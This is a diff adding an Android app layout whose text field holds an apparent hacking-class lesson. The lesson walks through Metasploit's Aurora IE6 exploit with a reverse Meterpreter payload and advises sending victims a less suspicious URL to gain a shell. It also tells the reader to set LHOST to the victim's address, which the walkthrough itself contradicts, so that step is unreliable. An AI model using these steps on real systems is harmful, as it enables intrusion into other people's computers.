@@ -1,0 +1,139 @@
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+     xmlns:ads="http://schemas.android.com/apk/res-auto"
+     
+     
+    android:id="@+id/ScrollView1"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@drawable/back_of_reading"
+    android:paddingBottom="0dp"
+    android:paddingLeft="@dimen/activity_horizontal_margin"
+    android:paddingRight="@dimen/activity_horizontal_margin"
+    android:paddingTop="0dp"
+    tools:context="com.sanki.hackingclass.Ca" >
+
+    <RelativeLayout
+        android:layout_width="match_parent"
+        android:layout_height="1683dp" >
+
+        <TextView
+            android:id="@+id/textView1"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentTop="true"
+            android:layout_centerHorizontal="true"
+            android:text="Aurora"
+            android:textAppearance="?android:attr/textAppearanceLarge"
+            android:textColor="#4b4b4b"
+            android:textStyle="bold" />
+
+        <ImageView
+            android:id="@+id/imageView1"
+            android:layout_width="280dp"
+            android:layout_height="180dp"
+            android:layout_below="@+id/textView1"
+            android:layout_centerHorizontal="true"
+            android:layout_marginTop="21dp"
+            android:src="@drawable/cch" />
+
+        <TextView
+            android:id="@+id/textView2"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_below="@+id/imageView1"
+            android:layout_centerHorizontal="true"
+            android:layout_marginTop="20dp"
+            android:autoLink="web"
+            android:clickable="true"
+            android:text="Aurora is a browser based exploit, which means that payload is injected through the browser on the victim machine. Aurora exploits a memory corruption flaw in Internet Explorer 6. It’s quite outdated, but we’re taking baby steps here and this one’s quite easy.\n\nThis very exploit was used in Operation Aurora by a group of hackers who compromised a large number of major computer systems, including Adobe. This attack started in mid-2009 and continued through December. Internet Explorer has a ridiculously long list of potential vulnerabilities, although most (if not all) of which have been fixed in today’s version. Every software will have its bad day at some point. The only way to avoid the fallout is to keep up with the news, maybe just peek the headlines and stay away from dangerous applications. Zero day exploits are known to be used by several hackers to setup zombie networks without the (potentially, thousands of) victims ever finding out.\n\nIE 6 was released in 2001, to carry out this hack you may want to download the older version of IE.\nFire up Metasploit and let’s start by choosing aurora:\n\n»Use exploit/windows/browser/ms10_002_aurora\n\nNext, set payload to reverse meterpreter.\n\n»set payload windows/meterpreter/reverse_tcp\n\nNow we need to input LHost, Lport (for Payload) and SrvHost for aurora. Lhost and SrvHost have to be the same. You can also change srvport, but you can leave it to 8080 (Default) if you want.\n\n»Set LHost 192.168.2.103\n»Set LPort 4444\n»Set SrvHost 192.168.2.103\n\n(The IP address used is just an example, you need to replace it with the address of your victim) We also have the option change uripath. What’s that? This exploit works by opening a URL in the old buggy IE6. Uripath gives us that URL, which when opened in our victim’s computer sets up a connection through the specified ports to us, giving us the meterpreter session.\n\nThe best way to practice these attacks and exploits is with a willing (and trustworthy) friend. You can also set up multiple virtual machines on your own system, but I think that overly complicates things, plus most average computers have a hard time running a single virtual machine with decent performance. If you have more than one computer, maybe a laptop you could try getting a LAN (Ethernet) cable and connect the two together. Again, the easiest way is two systems with known IP addresses connected to the internet.\n\nWe’re simply going to set the uripath to a slash character that will let metasploit come up with its own URL that we can use. It should be something like:\nhttp://192.168.2.103:3421\n\nChanging the uripath to slash character, as below gives us a smaller URL. Doesn’t really matter, but it’s a tiny bit less suspicious.\n\n»set uripath /\n\nType exploit, and our local server will start. That is, when the victim opens up the URL we send them, it connects them directly to our makeshift server. It won’t open anything in the victim’s browser, just a blank page but it establishes the connections and gives us the meterpreter session. Mission accomplished.\n\nSo, now we know another exploit, another way to break into our victim’s computer. In reality, we haven’t even scratched the surface yet. There are currently over 2500 different exploits included in Metasploit that we can use. The entire database is available at:\nhttp://www.rapid7.in/db/modules/\n\nYou can head over there and enter search queries to find different exploits. Suppose, that you know a system has an old version of a software, say Adobe Reader 9.1. You can type in ‘adobe reader 9.1&apos; in the search box and it will give you a list of all the exploits that you can use to exploit the faulty software to gain access to the computer. I recommend you try out as many as you can. Take a look at your own computer, see if you can find any exploitable application on your computer, maybe challenge a friend to find a new vulnerability on your system. In hacking, knowing the tricks of the trade involves getting used to the usual hacking process. What we’re doing is just that. Metasploit is an incredibly powerful tool with tons of features and options. The best way to learn a software is to press every button just to see what happens. So go ahead. Explore."
+            android:textAppearance="?android:attr/textAppearanceMedium"
+            android:textColor="#4b4b4b" />
+
+        <RelativeLayout
+            android:id="@+id/relativeLayout1"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/textView2"
+            android:layout_marginTop="16dp" >
+
+            <ImageView
+                android:id="@+id/imageView2"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentLeft="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/previous2" />
+
+            <ImageView
+                android:id="@+id/imageView3"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentLeft="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/previous" />
+
+            <ImageView
+                android:id="@+id/imageView4"
+                android:layout_width="140dp"
+                android:layout_height="50dp"
+                android:layout_alignParentTop="true"
+                android:layout_centerHorizontal="true"
+                android:src="@drawable/rateintxt2" />
+
+            <ImageView
+                android:id="@+id/imageView5"
+                android:layout_width="140dp"
+                android:layout_height="50dp"
+                android:layout_centerHorizontal="true"
+                android:layout_centerVertical="true"
+                android:src="@drawable/rateintxt" />
+
+            <ImageView
+                android:id="@+id/imageView6"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentRight="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/next2" />
+
+            <ImageView
+                android:id="@+id/imageView7"
+                android:layout_width="60dp"
+                android:layout_height="50dp"
+                android:layout_alignParentRight="true"
+                android:layout_alignParentTop="true"
+                android:src="@drawable/next" />
+        </RelativeLayout>
+
+        <TextView
+            android:id="@+id/textView3"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/relativeLayout1"
+            android:layout_marginTop="19dp"
+            android:textAppearance="?android:attr/textAppearanceLarge" />
+
+        <TextView
+            android:id="@+id/textView4"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_alignParentLeft="true"
+            android:layout_below="@+id/textView3"
+            android:textAppearance="?android:attr/textAppearanceLarge" />
+
+        
+        <com.google.android.gms.ads.AdView
+        android:id="@+id/adView"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:layout_centerHorizontal="true"
+        android:layout_alignParentBottom="true"
+        ads:adSize="BANNER"
+        ads:adUnitId="@string/banner_ad_unit_id">
+    </com.google.android.gms.ads.AdView>
+    </RelativeLayout>
+
+</ScrollView>
